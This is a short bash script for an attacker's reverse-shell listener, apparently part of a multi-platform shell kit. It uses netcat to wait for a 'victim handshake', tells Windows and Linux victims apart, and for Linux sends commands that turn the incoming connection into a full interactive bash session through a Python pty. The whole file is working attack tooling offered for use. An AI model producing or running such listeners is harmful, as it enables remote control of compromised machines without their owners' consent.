#!/bin/bash
PORT=${1:-4444}

echo -e "\e[1;32m[+]\e[0m Multi-Platform Listener on port \e[1;33m$PORT\e[0m..."
echo "[*] Waiting for victim handshake..."

# FIX: Added < /dev/null to prevent nc from consuming the piped script
IDENT=$(nc -lvnp $PORT < /dev/null | head -n 1 | tr -d '\r\n')

if [[ "$IDENT" == *"WINDOWS_SHELL"* ]]; then
    echo -e "\e[1;36m[*]\e[0m Windows detected!"
    stty sane
    nc -lvnp $PORT
elif [[ "$IDENT" == *"LINUX_SHELL"* ]]; then
    echo -e "\e[1;34m[*]\e[0m Linux detected! Upgrading TTY..."
    stty raw -echo
    # Using a subshell to keep the interactive cat alive
    (echo "stty cols $(tput cols) rows $(tput lines) 2>/dev/null; export TERM=xterm-256color; python3 -c 'import pty; pty.spawn(\"/bin/bash\")' || /usr/bin/script -qc /bin/bash /dev/null"; cat) | nc -lvnp $PORT
    stty sane
else
    echo -e "\e[1;31m[!]\e[0m Unknown handshake: '$IDENT'."
    stty sane
    nc -lvnp $PORT
fi
